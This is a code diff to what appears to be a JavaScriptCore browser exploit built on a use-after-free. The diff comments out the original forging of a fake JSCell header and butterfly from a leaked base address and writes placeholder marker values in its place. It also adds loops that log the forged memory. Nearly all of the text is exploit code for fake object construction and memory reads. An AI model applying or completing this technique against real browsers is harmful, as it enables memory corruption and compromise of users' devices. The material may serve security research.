@@ -197,6 +197,10 @@ addEventListener('unhandledrejection', event => {
 
  
   const dv = new DataView(buf.buffer);
+ for (let i = 0; i < UAF_SIZE; i += 8) {
+  let q = dv.getBigUint64(i, true);
+  log(`[FAKE VERIFY] @0x${i.toString(16)} = 0x${q.toString(16)}`);
+}
   function read64(view, offset) {
     const low = view.getUint32(offset, true);
     const high = view.getUint32(offset + 4, true);
@@ -216,17 +220,41 @@ for (let i = 0; i < 0x40; i += 8) {
 
   const fake = new Uint8Array(UAF_SIZE);
   const fv = new DataView(fake.buffer);
-  fv.setUint32(0, Number((base + BigInt(off.js_cell_header)) & 0xffffffffn), true);
+ /* fv.setUint32(0, Number((base + BigInt(off.js_cell_header)) & 0xffffffffn), true);
   fv.setUint32(4, Number(((base + BigInt(off.js_cell_header)) >> 32n) & 0xffffffffn), true);
   fv.setUint32(off.js_butterfly, Number((base + BigInt(off.butterfly_data)) & 0xffffffffn), true);
   fv.setUint32(off.js_butterfly+4, Number(((base + BigInt(off.butterfly_data)) >> 32n) & 0xffffffffn), true);
   fv.setUint32(off.js_butterfly - 0x10, 7, true);
   fv.setUint32(off.js_butterfly - 8, 1, true);
   fv.setUint32(off.js_butterfly - 4, 1, true);
+*/
+
+ // Header JSCell finto
+fv.setUint32(0x00, 0x41414141, true); // low
+fv.setUint32(0x04, 0x43434343, true); // high
+
+// Inline strimpl (es: 0x10)
+fv.setUint32(0x10, 0x44444444, true);
+fv.setUint32(0x14, 0x45454545, true);
+
+// Offset js_butterfly (es: 0x20)
+fv.setUint32(0x20, 0xdeadbeef, true);
+fv.setUint32(0x24, 0xcafebabe, true);
+
+// Simula capacity
+fv.setUint32(0x10, 0x7, true);   // max length
+fv.setUint32(0x18, 0x1, true);   // start index
+fv.setUint32(0x1c, 0x1, true);   // size
 
   new Uint8Array(buf).set(new Uint8Array(fake));
   log("[+] Fake JSCell written");
+ 
+for (let i = 0; i < UAF_SIZE; i += 8) {
+  let val = getBigUint64Compat(dv, i, true);
 
+  log(`[FAKE @0x${i.toString(16)}] = 0x${val.toString(16)}`);
+}
+ 
   const bv = new BufferView(buf.buffer);
   const fakeArr = bv.readU64(off.js_butterfly);
 
